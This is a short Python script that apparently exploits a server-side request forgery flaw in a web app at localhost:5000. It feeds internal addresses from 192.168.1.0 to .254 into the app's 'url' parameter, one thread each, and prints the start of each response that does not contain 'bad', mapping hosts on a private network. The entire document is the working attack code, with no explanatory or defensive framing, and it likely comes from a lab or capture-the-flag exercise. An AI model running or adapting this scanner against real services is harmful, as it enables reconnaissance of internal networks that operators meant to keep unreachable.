import requests
import threading
import time

def scan(url, num):
    url = url.format(num)
    print("scanning {}".format(url))
    try:
        r=requests.get(url)
        if r.text.find('bad')>-1:
            pass
        else:
            print(url+": "+r.text[:100])
    except:
        pass

def main():
    url="http://localhost:5000/?url=http://192.168.1.{}"
    for num in range(255):
        time.sleep(0.1)
        threading._start_new_thread(scan, (url,num))

if __name__=="__main__":
    main()
